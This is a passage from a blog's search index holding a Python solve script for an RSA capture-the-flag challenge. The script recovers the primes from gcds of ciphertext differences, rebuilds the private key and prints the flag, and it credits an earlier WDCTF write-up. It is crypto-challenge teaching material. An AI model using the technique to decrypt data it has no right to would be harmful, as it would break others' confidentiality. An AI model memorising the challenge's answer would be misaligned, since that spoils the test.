number">1</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>    g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span>    <span class="token keyword">if</span> g <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'modular inverse does not exist'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x <span class="token operator">%</span> mc2 <span class="token operator">=</span> <span class="token number">1246234818568605038771725387770032809896657624658751197487822667705150496788266236821445252745402061440344837126297118817722352360943422714353348519968257483217425318287123603122559539044278216514618542935008251728016376351207287908907419066172027356649934716661853550169371283110451199593919378518682893908073257597996213276417788967527409800490507319098619694553882580772197585922179030322385772341029003564359719244782484762058530989277184051441547024568631595655539528137422918541855814336215841836541683256179952847812650782272979437883178787135567291812430132598562391722110607279005808604132547633446702754242</span>c1 <span class="token operator">=</span> <span class="token number">13455981172983326464102311937762831661788310626361076786164994487793945326981111197066703467784063584677545316464486222690177319997065759168374653040496712059568682406584202721616582863702654975066950060466986422582257001703187853927809075825528343329091775200012208860563692058684819775698290978617780577594014210672865880497874392738697086445744342656347507587613428993075257255547029724259635931665971785614738909042286207279739603543188892504358133043289264464915763121424437513688474543252743250750837754962444189265768058493217120380229238478428390747580847275659398491959011425398794606200760449574140326761335</span>c3 <span class="token operator">=</span> <span class="token number">4888187708328317620094507614800274226981107085929590254185425273559042976171503907943793194842845890835133406885671925681517347731439124039971268535772441389943526257018243714512592593512323296725941627631582840937936230289732464068819395084847503736153991018426601148001171410680610396315398455868476519242523364370643315263903656899707643857165005292144961418736390628879183534554050946402008748537061851428674751948379857099827888766867529291843558247067650218013841320566949128247840292451599528568785840031947044173916230774125850838571273228740235067857273673072775479606479505558411747622879981674961795496398</span>c4 <span class="token operator">=</span> <span class="token number">5945807707085423616106397090464145288661224101014907693104654596081518092031824289580553655597136400293583390581989219838293858796303129177903562794487009660324129992480484791256849653177916440709763357317237732026978876936371843211238777064330897077782446698577278202922221650609784909136488983753316374328060041688862833502261386605214386656750469198595184961624056503168436674528338454488445689162595307651649338939926811181397583426347049799471037024928424365956074689363634987714880064366326557578148205795406310315807810873199906864220949509516643869325208494504730147145059516579980994124490343208766447536810</span>c5 <span class="token operator">=</span> <span class="token number">6187445948828077692015970911804646938282242052772994916845077569070730070453969382819385152870562813549652542234501650247554999118997287612656768657169917874500360552882579507148077964788035519927189184337650311696041346297615679489279371787315665879866086591715868260088943256008041145891355773432381271043597673424658569516927545882320343535771872720945022165744462740208023473214182506701311573606230422976998106293803156552098142853857635121713770388765373265153557740921629496699557717987765469270646934300913295007513219413849883613183601728166411181113787689840581266359785250985019212532583960800460788015491</span>c6 <span class="token operator">=</span> <span class="token number">5212091418073782411520553214182135709421767268933861097557470068670598830761237108296366132955527825989098372862689616150847719971020880914262684813844505249039731390296288313064277036616294317850242554242344468349017823603991546642546139312359635120516022621977198868713265236780584328968456455227210401242292651898111573896055644196069499504205254423973191477361052269017513569237003435455766967610384127786317357129201800175882818678442257638418605140567086462026872695510406713566416179338847089594383139719544078973639147656333759205784973323451162915648440751084782358602950098354039646328692181357908591122714</span>c7 <span class="token operator">=</span> <span class="token number">3655638351649160392053613377223998746456935081525685917833104279800461813163792301601632928836306436302774882558931553763046873854372645433876037722220899647761264466458772539363592772806366025160060082392022496959043608616479633871824843539139765269866557324139669669180299880464960812373747543711884223811204173243558307161330834607275612285093379360358536623915157494256701984991891771698584900549732277659667805289723868414345078895913383480318010760628083474820289670382156241646315278789987701943251698483519785588242374214684684812447667402223553085547756490931266818022366894997520489636576763520143455761239</span>c8 <span class="token operator">=</span> <span class="token number">22473849661397275053996298243554884261414191820929237708168650853330395912319504073426952208513086627198829384154042315234052506082911684608144173835091410795393615116386997884885069683405033389454289189585622646957977150864405507253019700368456175153569120706431504842630017193823414614613515543944012768438615372135192092455771020625920899643657460748140525123446385745452885018242994907719060418829076821951353655094288932417789785658686354925401717179930381179237133075628900875416109603229568575866141143927588631408100548721530988132959911381450682687082674104687988294384311340599275049224252503713916928373410</span>c9 <span class="token operator">=</span> <span class="token number">1873513506226622659558980965960349556051601818636390593699111238742079235436048735742501009666517921834732172263333584189891447981830661750295791445758897570358691214228971207469306988655891013882209331385427955502522192570359268476079812111160032458293920218131883616683323041237563743943563895577660520218905767619038915659113775800791354119111094458073436219216055603238833113774387249183198627105364934918297190119325269494891789384314242315970885073496066247057106399028140269736234473860608631980241965505615924442715413658175017031374265609800935996459163053296259788980765102199701839555511572730799034774424</span>c10<span class="token operator">=</span> <span class="token number">20415066745705913332960559851272168836161858864856687615100156867932858500059203383582659999680270947712850092591947365553338831150848535525568756863490320019679102804007709747313186252161566229585999657772047185972884107522202907260488147758131548047735509416576778951156037782507571965765760567109821746219259712533369530160331404056822935924868818144471996283443950605787104623265573763097577017088633658357190202370173046308936352735690024216178434559387107878752418634566838258964132836294305792991271935081972613859675575909742688564959474926073661839487937083301362266785004789397144843903897244356681794196480</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>c3<span class="token operator">-</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token punctuation">(</span>c6<span class="token operator">-</span>c9<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>c7<span class="token operator">-</span>c9<span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> c1n <span class="token operator">=</span> p<span class="token operator">*</span>qd <span class="token operator">=</span> modinv<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考:[Eb0ny]<a href="https://eb0ny.github.io/2017/09/26/WDCTFfinal-RSA/">https://eb0ny.github.io/2017/09/26/WDCTFfinal-RSA/</a></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
